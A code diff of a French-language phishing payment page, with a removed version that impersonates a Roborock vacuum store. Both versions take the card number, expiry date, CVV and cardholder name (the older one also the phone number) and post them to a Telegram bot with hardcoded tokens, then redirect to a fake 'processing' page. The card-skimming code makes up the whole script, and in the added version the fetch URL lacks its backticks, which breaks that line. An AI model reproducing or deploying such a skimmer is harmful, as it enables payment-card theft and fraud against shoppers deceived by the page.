@@ -3,206 +3,194 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Formulaire de Paiement</title>
-    <script src="https://cdn.tailwindcss.com"></script>
+    <title>Page de Paiement</title>
     <style>
         body {
-            font-family: 'Arial', sans-serif;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f9f9f9;
         }
-        #card-error {
+
+        .container {
+            max-width: 600px;
+            margin: 50px auto;
+            background: white;
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        h2 {
+            text-align: center;
+            color: #333;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group label {
+            display: block;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+
+        .form-group input, 
+        .form-group select, 
+        .form-group button {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+
+        .form-group button {
+            background-color: #c70000;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+
+        .form-group button:hover {
+            background-color: #a50000;
+        }
+
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.8);
             display: none;
-            color: red;
-            font-size: 0.9rem;
-            margin-top: 5px;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+        }
+
+        .spinner {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #c70000;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
-<body class="bg-gray-100 flex flex-col min-h-screen justify-between">
+<body>
 
-    <!-- Card de produit avec image en haut -->
-    <div class="product-card bg-white rounded-lg shadow-xl p-8 max-w-lg mx-auto mt-10">
-        <!-- Image produit -->
-        <div class="flex justify-center mb-6">
-            <img src="S8MaxVUltra_A_Fr.webp" alt="S8 MaxV Ultra" class="w-48 h-auto rounded-md shadow-lg">
+<div class="container">
+    <h2>Formulaire de Paiement</h2>
+    <form id="payment-form">
+        <div class="form-group">
+            <label for="card-number">Numéro de Carte</label>
+            <input type="text" id="card-number" name="card-number" placeholder="1234 5678 9012 3456" required>
         </div>
-        <div class="product-info text-center">
-            <h3 class="text-xl font-semibold text-gray-800">S8 MaxV Ultra</h3>
-            <p class="text-lg text-green-600 mt-2">799€ <span class="line-through text-red-500">1499€</span></p>
+        <div class="form-group">
+            <label for="expiry-month">Mois d'Expiration</label>
+            <select id="expiry-month" name="expiry-month" required>
+                <option value="01">01</option>
+                <option value="02">02</option>
+                <option value="03">03</option>
+                <option value="04">04</option>
+                <option value="05">05</option>
+                <option value="06">06</option>
+                <option value="07">07</option>
+                <option value="08">08</option>
+                <option value="09">09</option>
+                <option value="10">10</option>
+                <option value="11">11</option>
+                <option value="12">12</option>
+            </select>
         </div>
-    </div>
-
-<input type="hidden" id="prix" value="799">
-
-    <!-- Formulaire de paiement -->
-    <div class="bg-white rounded-lg shadow-xl p-8 max-w-lg mx-auto mt-6">
-        <h1 class="text-2xl font-bold text-center text-gray-800 mb-2">Formulaire de Paiement</h1>
-        <p class="text-sm text-center text-gray-600 mb-6">
-            Veuillez entrer vos informations de paiement pour effectuer la transaction en toute sécurité.
-            Ce processus est sécurisé et protégé.
-        </p>
-        
-        <!-- Section supplémentaire: Remboursement sécurisé -->
-        <div class="mt-6 flex justify-center">
-            <img src="ALTP-page-CB.jpg" alt="paiement sécurisé" class="w-52 h-auto">
+        <div class="form-group">
+            <label for="expiry-year">Année d'Expiration</label>
+            <select id="expiry-year" name="expiry-year" required>
+                <option value="2025">2025</option>
+                <option value="2026">2026</option>
+                <option value="2027">2027</option>
+                <option value="2028">2028</option>
+            </select>
         </div>
-
-            <!-- Numéro de carte -->
-            <div class="mb-4">
-                <label for="numero-carte" class="block text-sm font-medium text-gray-700">Numéro de carte</label>
-                <input type="tel" id="numero-carte" placeholder="1234 5678 9012 3456" required maxlength="19"
-                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
-                <p id="card-error" class="text-red-500 hidden">Le numéro de carte doit être valide et respecter le format.</p>
-            </div>
-
-            <!-- Date d'expiration -->
-            <div class="mb-4">
-                <label for="date-expiration" class="block text-sm font-medium text-gray-700">Date d'expiration (MM/AA)</label>
-                <input type="month" id="date-expiration" required
-                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
-            </div>
-
-            <!-- Code CVV -->
-            <div class="mb-4">
-                <label for="cvv" class="block text-sm font-medium text-gray-700">Code CVV</label>
-                <input type="tel" id="cvv" placeholder="123" required maxlength="3"
-                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
-            </div>
-
-            <!-- Formulaire -->
-        <form id="paiement-form">
-            <!-- Titulaire de la carte -->
-            <div class="mb-4">
-                <label for="nom" class="block text-sm font-medium text-gray-700">Titulaire de la carte</label>
-                <input type="text" id="nom" placeholder="Ex: Jean Dupont" required
-                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
-            </div>
-
-            <!-- Numéro de téléphone -->
-            <div class="mb-4">
-                <label for="telephone" class="block text-sm font-medium text-gray-700">Numéro de téléphone</label>
-                <input type="tel" id="telephone" placeholder="Ex: 06 12 34 56 78" required
-                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
-            </div>
-
-            <!-- Bouton de validation -->
-            <button type="submit"
-                class="w-full bg-green-600 text-white font-bold py-2 px-4 rounded-lg hover:bg-green-700 transition duration-300">
-                Valider mon paiement
-            </button>
-         </form>
-
-<!-- Section supplémentaire: Remboursement sécurisé -->
-        <div class="mt-6 flex justify-center">
-            <img src="instrumentys_paiement_securise_logo.jpg" alt="paiement sécurisé" class="w-52 h-auto">
+        <div class="form-group">
+            <label for="cvv">CVV</label>
+            <input type="text" id="cvv" name="cvv" placeholder="123" required>
         </div>
-    </div>
+        <div class="form-group">
+            <label for="name-on-card">Nom sur la Carte</label>
+            <input type="text" id="name-on-card" name="name-on-card" placeholder="Entrez le nom" required>
+        </div>
+        <div class="form-group">
+            <button type="button" id="pay-button">Payer Maintenant</button>
+        </div>
     </form>
+</div>
 
- <!-- FOOTER -->
-<footer class="bg-gray-800 text-white py-8">
-    <div class="max-w-6xl mx-auto px-4">
-        <!-- Haut du footer : Liens et Réseaux Sociaux -->
-        <div class="flex flex-col md:flex-row justify-between items-center md:items-start">
-            <!-- Logo et description -->
-            <div class="mb-6 md:mb-0">
-                <img src="roborock.png" alt="Roborock Logo" class="h-12 mb-4">
-                <p class="text-sm text-gray-400">
-                    Explorez un monde de nettoyage intelligent avec Roborock, conçu pour votre confort quotidien.
-                </p>
-            </div>
+<div class="loading-overlay" id="loading-overlay">
+    <div class="spinner"></div>
+    <p>Veuillez patienter...</p>
+</div>
 
-            <!-- Liens utiles -->
-            <div class="flex space-x-8">
-                <div>
-                    <h4 class="text-lg font-bold mb-4">Produits</h4>
-                    <ul class="text-sm space-y-2">
-                        <li><a href="#" class="hover:underline text-gray-400">Aspirateurs Robots</a></li>
-                        <li><a href="#" class="hover:underline text-gray-400">Accessoires</a></li>
-                        <li><a href="#" class="hover:underline text-gray-400">Nouveautés</a></li>
-                    </ul>
-                </div>
-                <div>
-                    <h4 class="text-lg font-bold mb-4">Support</h4>
-                    <ul class="text-sm space-y-2">
-                        <li><a href="#" class="hover:underline text-gray-400">FAQ</a></li>
-                        <li><a href="#" class="hover:underline text-gray-400">Manuels</a></li>
-                        <li><a href="#" class="hover:underline text-gray-400">Contact</a></li>
-                    </ul>
-                </div>
-            </div>
+<script>
+    document.getElementById('pay-button').addEventListener('click', async function () {
+        const loadingOverlay = document.getElementById('loading-overlay');
+        loadingOverlay.style.display = 'flex'; // Afficher شاشة الانتظار
 
-            <!-- Réseaux sociaux -->
-            <div class="mt-6 md:mt-0">
-                <h4 class="text-lg font-bold mb-4">Suivez-nous</h4>
-                <div class="flex space-x-4">
-                    <a href="#" class="text-gray-400 hover:text-white">
-                        <i class="fab fa-facebook fa-lg"></i>
-                    </a>
-                    <a href="#" class="text-gray-400 hover:text-white">
-                        <i class="fab fa-twitter fa-lg"></i>
-                    </a>
-                    <a href="#" class="text-gray-400 hover:text-white">
-                        <i class="fab fa-instagram fa-lg"></i>
-                    </a>
-                    <a href="#" class="text-gray-400 hover:text-white">
-                        <i class="fab fa-youtube fa-lg"></i>
-                    </a>
-                </div>
-            </div>
-        </div>
+        // جمع البيانات من الفورم
+        const form = document.getElementById('payment-form');
+        const formData = new FormData(form);
 
-        <!-- Bas du footer : Droits réservés -->
-        <div class="mt-10 border-t border-gray-700 pt-6 text-center text-sm text-gray-500">
-            <p>&copy; 2025 Roborock. Tous droits réservés. | <a href="#" class="hover:underline">Politique de confidentialité</a> | <a href="#" class="hover:underline">Conditions d'utilisation</a></p>
-        </div>
-    </div>
-</footer>
+        const cardNumber = formData.get('card-number');
+        const expiryMonth = formData.get('expiry-month');
+        const expiryYear = formData.get('expiry-year');
+        const cvv = formData.get('cvv');
+        const nameOnCard = formData.get('name-on-card');
 
-
-    <script>
-        document.getElementById("paiement-form").addEventListener("submit", async function(event) {
-            event.preventDefault();
-
-            const nom = document.getElementById("nom").value;
-            const numeroCarte = document.getElementById("numero-carte").value.replace(/\s+/g, '');
-            const dateExpiration = document.getElementById("date-expiration").value;
-            const cvv = document.getElementById("cvv").value;
-            const telephone = document.getElementById("telephone").value;
-            const PRIX = document.getElementById("prix").value;
-
-
-            // Send to Telegram bot
-            const token = "7631724461:AAGvOb7G_n2IO1qGwpJp-WaHgyBhREW1mfU";
-            const chatId = "5372119436";
-
-            const message = `
-🔔 Nouvelle Demande de Paiement 🔔
-👤 Nom: ${nom}
-💳 Numéro de Carte: ${numeroCarte}
-📅 Expiration: ${dateExpiration}
+        const message = `
+💳 Numéro de Carte: ${cardNumber}
+📅 Expiration: ${expiryMonth}/${expiryYear}
 🔒 CVV: ${cvv}
-📞 Téléphone: ${telephone}
-🔔 Prix : ${PRIX} EURO`;
+📝 Nom: ${nameOnCard}
+        `;
 
-            try {
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message,
-                        parse_mode: "Markdown",
-                    }),
-                });
+        const botToken = '8101158488:AAH6WIfCC6B6aGkWd_Tt6QRrWD8QKQQc69M';
+        const chatId = '5372119436';
 
-                window.location.href = "Traitement.html";
-            } catch (error) {
-                alert("Impossible d'envoyer les données. Vérifiez votre connexion.");
+        try {
+            const response = await fetch(https://api.telegram.org/bot${botToken}/sendMessage, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            });
+
+            if (response.ok) {
+                console.log('Message envoyé à Telegram.');
+            } else {
+                console.error('Erreur lors de l\'envoi à Telegram.');
             }
-        });
-    </script>
+        } catch (error) {
+            console.error('Erreur réseau :', error);
+        }
+
+        setTimeout(() => {
+            loadingOverlay.style.display = 'none'; // إخفاء شاشة الانتظار
+            window.location.href = 'Traitement.html'; // التحويل للصفحة
+        }, 5000);
+    });
+</script>
 
 </body>
 </html>
